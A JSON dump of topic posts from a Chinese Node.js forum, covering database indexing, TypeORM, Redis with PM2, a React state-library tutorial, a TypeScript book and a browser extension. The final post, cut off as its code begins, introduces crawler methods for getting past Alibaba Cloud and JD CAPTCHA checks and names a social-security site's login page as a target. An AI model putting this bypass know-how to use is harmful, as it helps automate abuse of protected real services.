href=\"https://www.frontendjs.com/site/5c22e04a79f5dabfd2a2bb80\">cnode评分</a></p>\n</div>","title":"新开发了个功能，对网站进行评分，说说你对cnode的想法吧","last_reply_at":"2019-01-18T01:53:34.118Z","good":false,"top":false,"reply_count":0,"visit_count":860,"create_at":"2019-01-18T01:53:34.118Z","author":{"loginname":"bestvist","avatar_url":"https://avatars2.githubusercontent.com/u/22828569?v=4&s=120"}},{"id":"5c403aeaa4d44449266b20b6","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>比如有一张表，主键ID是数组，我知道B+树是怎么存储ID作为索引的。但是有另外一个name字段，name字段是字符串类型的，在name字段上建索引，这个索引结构是什么样子的呢？B+树是怎么存储name字段的索引的呢？</p>\n</div>","title":"我知道怎么用b+树索引字段类型是数字的数据，但是怎么用b+树索引字段类型是字符串类型的数据呢？","last_reply_at":"2019-01-17T08:20:58.428Z","good":false,"top":false,"reply_count":0,"visit_count":650,"create_at":"2019-01-17T08:20:58.428Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5c111baf7ec239239ff5640a","author_id":"5b376dfcac8bc1e124114500","tab":"ask","content":"<div class=\"markdown-text\"><p>在评论写下你的答案！</p>\n</div>","title":"多少人用 React，Vue 和 Angula 2+ ?","last_reply_at":"2019-01-17T08:17:33.260Z","good":false,"top":false,"reply_count":14,"visit_count":1569,"create_at":"2018-12-12T14:31:11.495Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c3fe2bba4d44449266b1dce","author_id":"55522426a493c8d920a28bb8","tab":"ask","content":"<div class=\"markdown-text\"><p>hello, 请问下，我有三个表，collections， users,  user_collection, users和 collections是多对多的关系，\n根据id查collection，同时查出这个collection的users， 如下</p>\n<pre class=\"prettyprint\"><code>@Entity({name: &#x27;users&#x27;})\nexport class User {\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column(&#x27;varchar&#x27;, { length: 100 })\n    username: string;\n\n    @ManyToMany(type =&gt; Collection, collection =&gt; collection.users)\n    @JoinTable({\n        name: &#x27;user_collection&#x27;,\n        joinColumn: {\n            name: &#x27;user_id&#x27;,\n            referencedColumnName: &#x27;id&#x27;,\n        },\n        inverseJoinColumn: {\n            name: &#x27;collection_id&#x27;,\n            referencedColumnName: &#x27;id&#x27;,\n        },\n    })\n    collections: Collection[];\n\t\n\t...\n\t\n</code></pre><pre class=\"prettyprint\"><code>@Entity({name: &#x27;collections&#x27;})\nexport class Collection {\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @ManyToMany(type =&gt; User, user =&gt; user.collections)\n    users: User[];\n\t\n\t...\n\t\n</code></pre><p>查询代码如下，这样查询，会得到user的所有字段，如果只想查询user的部分字段，如id, username的话，应该怎么写呢？</p>\n<pre class=\"prettyprint\"><code>await this.collectionRepository.findOne({\n        select: [&#x27;id&#x27;, &#x27;name&#x27;, &#x27;coverURL&#x27;, &#x27;announcement&#x27;, &#x27;allowPost&#x27;, &#x27;postMustAudit&#x27;, &#x27;creator&#x27;],\n        where: { id },\n        relations: [ &#x27;users&#x27; ],\n});\n\t\t\n</code></pre></div>","title":"TypeORM 关系查询,只查部分字段该怎么写?","last_reply_at":"2019-01-17T06:13:50.203Z","good":false,"top":false,"reply_count":2,"visit_count":764,"create_at":"2019-01-17T02:04:43.537Z","author":{"loginname":"shen100","avatar_url":"https://avatars2.githubusercontent.com/u/2443162?v=4&s=120"}},{"id":"5c3d75da3898674067a7f5d5","author_id":"52cce7827a15a38466a94b4b","tab":"share","content":"<div class=\"markdown-text\"><p>【Tracesr】是一个轻量级室内导航解决方案，主要应用于商超、景点、园区等区域内寻路场景，结合使用场景可以扩展全局消息、商家消息、和途径消息等多样化功能。</p>\n<p>项目地址：<a href=\"https://github.com/tracesr\">https://github.com/tracesr</a></p>\n<p>官网：<a href=\"https://tracesr.github.io/\">https://tracesr.github.io/</a></p>\n<p><img src=\"https://tracesr.github.io/static/tracesr_os.png\" alt></p>\n</div>","title":"Tracesr(觅迹寻路)，轻量级室内导航前端解决方案","last_reply_at":"2019-01-17T04:17:50.165Z","good":false,"top":false,"reply_count":5,"visit_count":1072,"create_at":"2019-01-15T05:55:38.271Z","author":{"loginname":"tower1229","avatar_url":"https://avatars1.githubusercontent.com/u/4016839?v=4&s=120"}},{"id":"5c1dfd0b76c4964062a1c8f4","author_id":"59e6c301bcfcc03162f2ffc3","tab":"share","content":"<div class=\"markdown-text\"><ol>\n<li>尽量少去修改原型链了， 特别是那类不是你的时候</li>\n<li>虽然一个对象扩展属性 那么方便， 也别往这个对象堆东西。缺乏层次结构</li>\n<li>尽量少用继承  ,</li>\n</ol>\n<p>EventTarget, EventEmitter 这样的类有必要去继承吗？？ 为啥不要弄成一个子属性？像下面？</p>\n<pre class=\"prettyprint language-js\"><code>class W {\n  constructor() {\n    this.listen = new EventTarget()\n  }\n}\n</code></pre><p>$ 我不懂 一个对象堆了那么多东西这样也就算了， 为啥一个函数也往上面堆其他属性, 静态属性 不能分开吗？？</p>\n<pre class=\"prettyprint language-js\"><code>function log(){}\nlog.xxx=123\nlog.ww=xxx;\n</code></pre></div>","title":"关于node 规范","last_reply_at":"2019-01-17T02:16:26.631Z","good":false,"top":false,"reply_count":4,"visit_count":980,"create_at":"2018-12-22T08:59:55.858Z","author":{"loginname":"spitWind","avatar_url":"https://avatars2.githubusercontent.com/u/18753430?v=4&s=120"}},{"id":"5c341f1c5bf06c5e7e3f2730","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>在网络一篇教程上看到,node.js使用redis直接调用同一个redis对象连接即可,因为node.js是单线程的没问题(忽略某业务使用连接时间过长导致返回慢的问题).如果现在node.js使用PM2开启l了集群模式,还是使用一个redis对象,会不会出现问题?如果会出现问题,那么每一次读取或写入redis服务器里的数据,就要new一个新的redis连接,使用完成在关闭连接,感觉很浪费资源啊!</p>\n</div>","title":"请教:node.js使用PM2开启集群模式,可否使用一个redis对象连接?","last_reply_at":"2019-01-17T01:53:09.953Z","good":false,"top":false,"reply_count":8,"visit_count":1120,"create_at":"2019-01-08T03:55:08.373Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c37f295a4d44449266af956","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>各位大哥给我github点个star呗</strong><a href=\"https://github.com/tzbcf/myblog-vue.cli-3.0-node-ts\">博客项目</a>\n目前公司业务不是很繁忙，自己决定开发一个个人博客项目。<a href=\"https://github.com/tzbcf/myblog-vue.cli-3.0-node-ts\">博客项目</a></p>\n<p>前端是vuecli 3.0脚手架后端是自己搭建的Node+koa+ts的项目架构。已经规划与开发近9天。</p>\n<p>感觉效率非常慢，假如在工作中，遇到一个全栈的项目需要自己开发的话，如果已这种效率，感觉会被打死。</p>\n<p>请问大家在开发中有什么提供开发效率的方法么？</p>\n<p>我感觉我自己出现以下症状有影响自己效率：\n\t1. 这近一年都在开发node,对vue陌生了一些\n\t2. 想开发出高质量的typescript的node项目，但是代码风格还是感觉像js\n\t3.页面规划与功能规划花费比较多的时间\n\t4.感觉自己的样式与dom布局还不是非常熟练，有几个层级关系的Bug影响了一个小时解决\n\t有点杂，不精，基础还是薄弱啊。。。。。</p>\n</div>","title":"如何提高开发效率","last_reply_at":"2019-01-17T01:22:48.928Z","good":false,"top":false,"reply_count":19,"visit_count":1282,"create_at":"2019-01-11T01:34:13.245Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5c3ee504a4d44449266b1a20","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><p>[react-control-center tutorial 1] <code>cc.startup</code></p>\n<blockquote>\n<p>注：本教程针对的有一定react基础知识的用户，如无任何react只是了解或者开发经验，可以先\b通过<code>create-react-app</code>快速跑起来一个应用并结合官网的知识介绍，再来阅读此文, \b对于react开发者可以运行起来quick-start项目做更深的了解</p>\n<h5>quick-start demo: <a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">https://github.com/fantasticsoul/rcc-simple-demo</a></h5>\n</blockquote>\n<hr>\n<h4>startup,让我们把cc启动起来</h4>\n<ul>\n<li>cc的\b启动非常容易，且对第三方包依赖极少，目前仅仅依赖了<code>co</code>和<code>uuid</code>,react15和16均能够使用</li>\n</ul>\n<blockquote>\n<p>cc和redux最大的不同之一就是，redux需要在你的顶层App组件之外包裹一个<code>\b\bProvider</code>组件，用于全局注入和管理<code>redux</code>的上下文context，对于cc来说只需要在你定义好cc的启动脚本，然后在你的代码入口文件的第一行里引用改脚本，就可以完成cc的启动工作了，所以使用cc并不会对你现有的代码造成任何入侵，你可以渐进式的在已有项目里\b局部使用cc，尝试cc的有趣且强大的功能</p>\n<blockquote>\n<p>后续会放出and-design-pro的cc版本，改动的代码不超过100行，就完美将其状态管理框架redux\b迁移到cc</p>\n</blockquote>\n</blockquote>\n<ul>\n<li>cc支持两种启动方式</li>\n</ul>\n<blockquote>\n<p>\bcc支持以模块化的方式和非模块的方式启动起来，如果以非模块的方式启动，cc的store只会有两个内建的模块存在，即<code>$$global</code>和<code>$$default</code>模块，如果以模块化的方式启动，则需要用户显示的划分好模块并作为配置参数交个cc启动让cc按照用户的规划理念启动起来。\n启动起来之后：</p>\n<ul>\n<li>cc将cc的store绑定到了window.sss下。</li>\n<li>cc将cc的顶层api绑定到window.cc下。</li>\n<li>cc将cc的上下文管理对象绑定到window.ccc下和window.CC_CONTEXT下 &lt;br/&gt;\n用户可以在console里通过sss可以查看当前状态\b树的最新状态，通过cc直接调用cc提供给开发者的顶层api与各个cc组件产生有趣的互动，这是cc让用户能够体会到cc的强大和有趣的入口之一。</li>\n</ul>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;**-----------------[引入cc启动脚本，\b让\b整个项目能够使用cc的所有接口]--------*&#x2F;\n&#x2F;**  code in index.js *&#x2F;\nimport &#x27;.&#x2F;startup-cc&#x27;;\nimport React from &#x27;react&#x27;;\nimport ReactDOM from &#x27;react-dom&#x27;;\nimport App from &#x27;.&#x2F;App&#x27;;\n\nReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#x27;root&#x27;));\n\n&#x2F;**-----------------[不写入任何参数，直接运行cc启动]-----------------------*&#x2F;\n&#x2F;**  code in  startup-cc.js *&#x2F;\nimport cc from &#x27;react-control-center&#x27;;\ncc.startup();\n</code></pre><ul>\n<li>以上示例里，我们调用了<code>cc.startup()</code>，启动了cc，在正式介绍cc的各种启动方式和区别之前，我们先来了解一下<code>startup</code>函数的签名介绍</li>\n</ul>\n<blockquote>\n<p>cc.startup(startupOption?:StartupOption);</p>\n<ul>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.isModuleMode</code> 是否以模块化方式启动cc，默认是false，cc强烈建议用户设置此项为true，方便用户定义更多的模块</li>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.store</code> 为cc配置store</li>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.reducer</code> 为cc配置reducer，reducer是一堆按模块划分的函数集合，可以是普通函数、生成器函数、async函数，每一cc实例上都可以通过this.$$dispatch派发action对象调用reducer里的函数，修改响应模块里的\b值</li>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.computed</code> 为cc配置computed，这里配置的是模块级别的computed，在cc实例里通过this.$$moduleComputed取到计算后的值</li>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.init</code> 为cc配置init，通常是需要从后端获取后再次赋值给store才需要配置此项</li>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.sharedToGlobalMapping</code> 为cc配置sharedToGlobalMapping，用户需要把一些模块的值映射到$$global模块时，需要配置此项</li>\n<li><a href=\"/user/param\">@param</a> <code>StartupOption.moduleSingleClass</code> 为cc配置<code>moduleSingleClass</code>，标记哪些模块只能注册生成一个ccClass，默认cc允许一个模块注册生成多个<code>cc类</code>，<code>moduleSingleClass</code>是一个对象，key为<code>moduleName</code>，值为布尔值，true就表示这个模块只允许注册一个<code>cc类</code> &lt;br /&gt;\n大家可以先对这些这些参数有个印象，阅读后面的讲解再逐步理解透这里面每一个参数的具体作用</li>\n</ul>\n</blockquote>\n<ul>\n<li>不管是模块话启动还是非模块启动，对于cc来说都存在这模块的概念</li>\n</ul>\n<blockquote>\n<p>非模块化启动，cc会内置两个模块<code>$$default</code>、<code>$$global</code>&lt;br/&gt;\n一个模块一定包含<code>state</code>，<code>reducer</code>、<code>init</code>、<code>computed</code>是可选项，根据用户的实际情况考虑是否配置</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/16/16855a7571b98b79?w=493&amp;h=343&amp;f=png&amp;s=14846\" alt></p>\n<ul>\n<li>非模块化模式启动cc，直接启动</li>\n</ul>\n<blockquote>\n<p>非模块方式通常适用于小规模的应用，状态划分简单，边界清晰，智能组件较少，开发时对状态的修改都比较清晰，业务上这些组件的领域分类不是很明显，例如基于react写一个表单提交（当然这只是举例，通常一个表单就不需要写成一个单页面应用了，但是如果是写一个生成通用表单的平台，为了方便维护和扩展，享受现代js开发ui带来的\b友好体验，开发者通常还是会选择一个ui库和状态管理库）</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;**-----------------[引入cc启动脚本，\b让\b整个项目能够使用cc的所有接口]--------*&#x2F;\n&#x2F;**  code in index.js *&#x2F;\nimport &#x27;.&#x2F;startup-cc&#x27;;\nimport React from &#x27;react&#x27;;\nimport ReactDOM from &#x27;react-dom&#x27;;\nimport App from &#x27;.&#x2F;App&#x27;;\n\nReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#x27;root&#x27;));\n\n&#x2F;**-----------------[不写入任何参数，直接运行cc启动]-----------------------*&#x2F;\n&#x2F;**  code in  startup-cc.js *&#x2F;\nimport cc from &#x27;react-control-center&#x27;;\n\n&#x2F;&#x2F; 缺省参数启动cc，cc会默认生成两个模块$$default、$$global\ncc.startup();\n&#x2F;&#x2F; 在console里输入sss, 可以查看到状态树形如: {$$default:{}, $$global:{}}\n\n</code></pre><ul>\n<li>非模块化模式启动cc，配置<code>$$global</code>模块和<code>$$default</code>模块启动</li>\n</ul>\n<blockquote>\n<p>\b通过上面我们知道以非模块\b化方式启动cc时，cc会自动创建2个模块<code>$$default</code>、<code>$$global</code>,但是cc也允许用户显示的申明两个模块的值, 为<code>StartupOption.store</code>配置一个初始化的状态树&lt;br/&gt;\n当用户显示的把store的key写为global或者default任意之一时，cc把store的key当做模块名，将global或者default对应的对象赋值给cc对应global模块或者default模块的状态树，其他多余的key会被cc警告用户使用模块化方式启动才能识别，但是cc只会警告用户，然后忽略这key的值启动起来</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;**-----------------[规划模块参数启动cc]----------------------------------*&#x2F;\n&#x2F;**  code in  startup-cc.js *&#x2F;\nimport cc from &#x27;react-control-center&#x27;;\n\n&#x2F;&#x2F; \b通过上面我们知道以非模块\b化方式启动cc时，cc会自动创建2个模块$$default、$$global\n&#x2F;&#x2F; 但是cc也允许用户显示的申明两个模块的值, StartupOption.store 为cc初始化一个状态树\n&#x2F;&#x2F; 当用户显示的把store的key写为$$global或者$default任意之一时，cc把store的key当做\n&#x2F;&#x2F; 模块名，将$$global或者$$default对应的对象赋值给cc对应$$global模块或者$$default\n&#x2F;&#x2F; 模块的状态树，其他多余的key会被cc警告用户使用模块化方式启动才能识别，但是cc只会警告\n&#x2F;&#x2F; 用户，然后忽略这key的值启动起来\n\ncc.startup({\n  store:{\n    $$global:{\n      themeColor:&#x27;pink&#x27;,\n      module:&#x27;pink&#x27;,\n    },\n    $$default:{\n      foo:&#x27;foo&#x27;,\n      bar:&#x27;bar&#x27;\n    },\n    thisModuleWillBeenIgnored:{&#x2F;&#x2F; 这对于cc来说是一个无效的模块声明\n      foo:&#x27;foo&#x27;,\n    }\n  }\n});\n\n\n&#x2F;&#x2F; 如果store直接赋值一个普通对象，不包含任何名字为$$default、$$global的key，cc默认\n&#x2F;&#x2F; 将这个对象处理为$$default模块的对象\ncc.startup({\n  store:{\n    themeColor:&#x27;pink&#x27;,\n    module:&#x27;pink&#x27;,\n  }\n});\n</code></pre><ul>\n<li>非模块化模式启动cc，配置<code>$$global</code>模块和<code>$$default</code>模块启动，为<code>$$global</code>模块配置<code>reducer</code>、<code>init</code>、<code>computed</code></li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;**  code in  startup-cc.js *&#x2F;\nimport cc from &#x27;react-control-center&#x27;;\ncc.startup({\n  store:{\n    $$global:{\n      themeColor:&#x27;&#x27;,\n      module:&#x27;pink&#x27;,\n      bonus:0,\n      recommendedLink:&#x27;&#x27;,\n    },\n    $$default:{\n      foo:&#x27;foo&#x27;,\n      bar:&#x27;bar&#x27;\n    }\n  },\n  reducer:{\n    $$global:{\n      changeThemeColor:function* ({payload:{userId, color}}){\n        &#x2F;&#x2F; 修改主题色，用户获得积分\n        const bonus = yield api.changeThemeColor({userId, color});\n        return {bonus};\n      },\n      recoverOriginalThemeColor:async function({payload:{userId}, dispatch}){\n        &#x2F;&#x2F; 恢复最初的主题色，各一个\b推荐链接\n        const recommendedLink = yield api.recoverOriginalThemeColor({userId});\n        dispatch({reducerModule:&#x27;whatever&#x27;,type:&#x27;trackUser&#x27;, payload:&#x27;wow wow&#x27;});\n        return {recommendedLink};\n      }\n    },\n    &#x2F;&#x2F; 注意此处申明了whaterver当做模块值，但是whaterver并没有在store里声明过，cc是允许用户这样做的，因为cc认为recuder可以有自己的模块划分定义，实际上当用户在cc实例里调用dispatch时，\n    &#x2F;&#x2F; 会形如this.$$dispatch({reducerModule:&#x27;whatever&#x27;,type:&#x27;trackUser&#x27;,payload:&#x27;cool&#x27;})这样，\n    &#x2F;&#x2F; cc会找到对应reducer模块whatever的type为trackUser的函数去执行数据修改逻辑,\n    &#x2F;&#x2F; this.$$dispatch里不指定reducerModule，默认会找Action对象里指定的module当做reducerModule，\n    &#x2F;&#x2F; Action对对象里没有指定module,会把当前cc实例所属的module当做reducerModule\n    whaterver:{\n      trackUser: function*(){\n        &#x2F;&#x2F; ... ...\n      }\n    }\n  },\n  init:{\n    $$global:setState=&gt;{\n      api.getInitThemeColor(themeColor=&gt;{\n        setState({themeColor});\n      })\n    }\n  },\n  computed:{\n    $$global:{\n      themeColor(themeColor){&#x2F;&#x2F; 当themeColor发生变化时，计算新的值，cc\b实例里的this.$$globalComputed.themeColor可以取到\n        return {spanBorder:&#96;2px solid ${themeColor}&#96;, pBorder:&#96;8px solid ${themeColor}&#96;};\n      }\n    },\n    $default:{\n      foo(foo){&#x2F;&#x2F; 反转foo字符串, cc实例里this.$$moduleComputed.foo可以取到改计算值\n        return foo.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);\n      }\n    }\n  }\n});\n</code></pre><ul>\n<li>模块化模式启动cc，\b</li>\n</ul>\n<blockquote>\n<p>需要在StartOption显示的设定<code>isModuleMode</code>为true，其他方式和上面的非模块的方式一样，唯一不同的是cc允许你使用其他名字作为模块名了，还允许你自定义StartOption.<code>sharedToGlobalMapping</code>将某些模块里的某些key起个别名映射到<code>$$global</code>模块里.&lt;br/&gt;\ncc提供<code>sharedToGlobalMapping</code>是因为在cc世界里，一个cc类只能观察\b注册的所属模块的状态变化（即一个cc类直属于一个模块），但是所有cc类都能够\b观察global模块的转态变化，当cc类需要观察其他模块的某些key的状态变化时，需要那个模块先将它的这些key映射到<code>$$global</code>里，然后cc类观察映射到<code>$$global</code>里的这些key，就达到了一个<code>cc类</code>可以观察多个模块变化的目的</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;**  code in  startup-cc.js *&#x2F;\nimport cc from &#x27;react-control-center&#x27;;\ncc.startup({\n  store:{\n    $$global:{\n      themeColor:&#x27;&#x27;,\n      module:&#x27;pink&#x27;,\n      bonus:0,\n      recommendedLink:&#x27;&#x27;,\n    },\n    $$default:{\n      foo:&#x27;foo&#x27;,\n      bar:&#x27;bar&#x27;\n    },\n    foo:{\n      f1:&#x27;f1&#x27;,\n      f2:&#x27;f2&#x27;,\n    },\n    bar:{\n      f1:&#x27;f1&#x27;,\n      f2:&#x27;f2&#x27;,\n    }\n  },\n  &#x2F;&#x2F;其他配置略 .......\n\n  &#x2F;&#x2F; 映射时注意命名冲突\n  sharedToGlobalMapping:{\n    &#x2F;&#x2F; 以下配置将foo模块的f1、f2字段映射到$$global里，\b因为$$global没有名字为f1、f2的字段，这里就不再起别名了\n    foo:{\n      f1:&#x27;f1&#x27;,\n      f2:&#x27;f2&#x27;,\n    },\n    &#x2F;&#x2F; 以下配置将bar模块的f1、f2字段映射到$$global里分别为bf1、bf2，因为$$global模块里已经存在了f1,f2，所以这里起了别名\n    bar:{\n      f1:&#x27;bf1&#x27;,\n      f2:&#x27;bf2&#x27;,\n    }\n  }\n}\n</code></pre><ul>\n<li>以上对<code>startup</code>的解释相信不少读者一定还有疑问，因为提前提到了一些后面还会进一步详细解释的名词概念，</li>\n</ul>\n<blockquote>\n<ul>\n<li>\b比如配合讲解<code>reducer</code>时提到了cc实例的<code>$$dispatch</code>,</li>\n<li>\b配合讲解<code>sharedToGlobalMapping</code>时，提到了观察多个模块状态变化，cc除了使用<code>sharedToGlobalMapping</code>达到观察多个模块状态变化的目的，还提供更强大的方式，注册为cc类时候声明<code>stateToPropMapping</code>，可以不用把目标观察模块的key映射到<code>$$global</code>就能够观察其他模块的状态变化，后面会做详解</li>\n<li>\b提到了一个<code>模块</code>可以注册多个<code>cc类</code>，整个cc世界里，<code>cc类</code>、<code>react类</code>、和<code>模块</code>的关系会\b如下图，大家可以先做\b简单了解，后面再回顾\b此图会理解更深</li>\n</ul>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/16/168559cf0123ae69?w=1379&amp;h=816&amp;f=png&amp;s=197933\" alt></p>\n<h4>C_C welcom to cc world</h4>\n<blockquote>\n<h4>quick-start demo: <a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">https://github.com/fantasticsoul/rcc-simple-demo</a></h4>\n</blockquote>\n</div>","title":"[react-control-center tutorial 1] 启动cc","last_reply_at":"2019-01-16T12:56:38.395Z","good":false,"top":false,"reply_count":1,"visit_count":526,"create_at":"2019-01-16T08:02:12.774Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"587debd7c4f5cf7619671524","author_id":"57cd6dbc8624502e4751354e","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"http://blog.xcatliu.com/2017/01/17/my_first_book/\">阅读原文</a></p>\n<hr>\n<p>持续了大半年的学习和写作，在今天终于告一段落了。</p>\n<h2>写书之旅</h2>\n<p>最初有写书的想法，是刚加入微软的时候。</p>\n<p>由于工作中需要重度使用 TypeScript，所以我花了几天的时间研读了好几遍官方手册和中文翻译版。</p>\n<p>对于一个把 OOP 早就还给老师的人，有些概念并不是很好理解，再加上官方手册跳跃般的学习曲线，我觉得我可以抓住这次学习的机会，把整个学习的过程总结下来。</p>\n<p>一开始，取名为《From JavaScript to TypeScript》，寓意此书的作者并不是 TypeScript 的专家，而是一个新手。</p>\n<p>其实这不一定是个劣势，因为有些坑，只有新手才能理解。我希望尽可能的还原第一次学习的场景，帮助大家更容易的理解 TypeScript。</p>\n<p>于是，我开始了我的写书之旅。</p>\n<h2>写书不易</h2>\n<p>要说写书的感受，那真是太不容易了。</p>\n<p>理解一个知识，和能够讲出来让别人理解完全是两码事。</p>\n<p>而我又是一个强迫症患者。</p>\n<ul>\n<li>为了方便查阅，添加了非常多引用</li>\n<li>为了一个措辞，会修订很多次</li>\n<li>为了能循序渐进的理解，调整了多次顺序</li>\n</ul>\n<p>最难的还是在于坚持，一开始还会觉得挺有意思挺新鲜，慢慢的就会很枯燥乏味，无数次的回头重读之前写的，无数次的修改。</p>\n<p>我收获的不只是对 TypeScript 理解的加深，而更是一份坚持的毅力和勇气吧。</p>\n<p>再之后捧起别人写的书，都会油然而生一股敬意。</p>\n<p>想必那一定也是比我付出更多百倍的精力才能写出来的了。</p>\n<h2>《TypeScript 入门教程》介绍</h2>\n<p>从 JavaScript 程序员的角度总结思考，循序渐进的理解 TypeScript。</p>\n<blockquote>\n<p>原名《From JavaScript to TypeScript》</p>\n</blockquote>\n<ul>\n<li><a href=\"https://ts.xcatliu.com/\">在线阅读</a>（部署在 <a href=\"https://www.gitbook.com/book/xcatliu/typescript-tutorial/details\">GitBook</a> 上，可能需要翻墙）</li>\n<li><a href=\"https://github.com/xcatliu/typescript-tutorial/blob/master/README.md\">在线阅读（GitHub 版）</a></li>\n<li><a href=\"https://github.com/xcatliu/typescript-tutorial\">GitHub 地址</a></li>\n<li>作者：<a href=\"https://github.com/xcatliu/\">xcatliu</a></li>\n<li>字数统计：约 6 万字（直接统计的字符数）</li>\n</ul>\n<p>更多介绍请<a href=\"https://github.com/xcatliu/typescript-tutorial\">进入 GitHub</a> 查看。</p>\n</div>","title":"我写的第一本书《TypeScript 入门教程》","last_reply_at":"2019-01-16T10:25:25.469Z","good":true,"top":false,"reply_count":39,"visit_count":11116,"create_at":"2017-01-17T10:03:03.859Z","author":{"loginname":"xcatliu","avatar_url":"https://avatars0.githubusercontent.com/u/5453359?v=4&s=120"}},{"id":"5c3d004ca4d44449266b0dcf","author_id":"5c3a86a23898674067a7e824","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://upload-images.jianshu.io/upload_images/2979799-dee155229ceba080.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt></p>\n<h2>源起</h2>\n<p>写这个插件的初衷是因为 <a href=\"https://github.com/Haixiang6123/codeblock-beautifier/blob/master/www.medium.com\">Medium</a> 总是不高亮作者的代码。当然也有人用 Codepen, CodeSandbox 或者 Gist 来嵌入代码。 但是这样实在麻烦，有些人（比如我）就很不想为了几句代码而创建一个 Gist 文件，然后直接用 Medium 提供的代码块。所以我经常看到这样的代码块</p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/2979799-b8cbf36e30ac426f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"Medium\"></p>\n<p>为了解决这个问题，我写了这个插件来高亮 <a href=\"https://github.com/Haixiang6123/codeblock-beautifier/blob/master/www.medium.com\">Medium</a> 里的代码块，后面还意外发现简书，知乎，StackOverflow 等网站都能高亮，嘻嘻！</p>\n<h2>样例</h2>\n<p>先看看效果吧~</p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/2979799-b0f61e675f6a64d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"效果图\"></p>\n<h2>安装与下载</h2>\n<ol>\n<li>\n<p>可以<a href=\"https://chrome.google.com/webstore/detail/code-block-beautifier/gpcjjddhdnilcbddlonlfgdbejfboonn\">点击这里</a>从谷歌应用商店下载。</p>\n</li>\n<li>\n<p>如果不能科学上网，可以直接从我 Github 上<a href=\"https://github.com/Haixiang6123/codeblock-beautifier/blob/master/pkg/codeblock-beautifier.crx\">直接下载</a>。</p>\n</li>\n</ol>\n<h2>使用</h2>\n<p>点击插件图标后会弹出下面的设置面板，看起来有点像编辑器。如果像平时写网页的UI布局就太无聊了，所以设计UI成编辑器的样子😝。\n<img src=\"https://upload-images.jianshu.io/upload_images/2979799-813c332829ed34d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"设置面板\"></p>\n<h2>更多</h2>\n<ol>\n<li>\n<p>更多内容可以访问 <a href=\"https://github.com/Haixiang6123/codeblock-beautifier/blob/master/README-CN.md\">Github 上的 repo</a></p>\n</li>\n<li>\n<p>我也在 B 站上录了个介绍视频，有兴趣可以<a href=\"https://www.bilibili.com/video/av40197852\">点击这里观看</a>。</p>\n</li>\n</ol>\n<h2>最后</h2>\n<p>在巴哈马旅游的时候就在构想这个插件，元旦回来后立马开工写了7天左右，其中也修复了很多 Bug。 当然 Bug 是修不完的，肯定还有一些 Bug 我没发现，如果你遇到了请给我写 Issue！ 如果你也喜欢我的插件，麻烦给个五星好评 :)，谢谢！</p>\n</div>","title":"终于可以在Medium上看高亮代码啦~~","last_reply_at":"2019-01-16T08:27:35.955Z","good":false,"top":false,"reply_count":5,"visit_count":1007,"create_at":"2019-01-14T21:34:04.866Z","author":{"loginname":"Haixiang6123","avatar_url":"https://avatars1.githubusercontent.com/u/17061654?v=4&s=120"}},{"id":"5c3b3f3ea4d44449266b0552","author_id":"57e37080f7dea63b0e6ab90b","tab":"share","content":"<div class=\"markdown-text\"><h2>年底了，爬虫干货献上–top2电商</h2>\n<h3>tips!</h3>\n<p>干货主要分两块：</p>\n<p>1.阿里云人机验证</p>\n<p>2.京东web滑块，京东H5图片验证</p>\n<p>以上干货仅仅只是用来技术交流，请勿在其他非法途径使用</p>\n<h4>阿里云人机验证</h4>\n<p>基本原理:通过chrome-launcher启动本地chrome(最好选择71的最新chrome版本,否则可能会遇到深坑)，</p>\n<p>1.无痕验证</p>\n<p>该验证只相当于其他验证的一个入口，用户真正会面对的是其他四种验证，所以后面我会对应用该验证的网站做一些详细说明</p>\n<p>2.智能验证:\n<img src=\"http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/pic/66310/cn_zh/1518006940944/%E6%99%BA%E8%83%BD%E5%9B%BE1.png\" alt=\"image\">\n某社保网站\n<a href=\"http://61.136.223.44/web2/src/index/login.html\">http://61.136.223.44/web2/src/index/login.html</a></p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;启动本地chrome\n    const 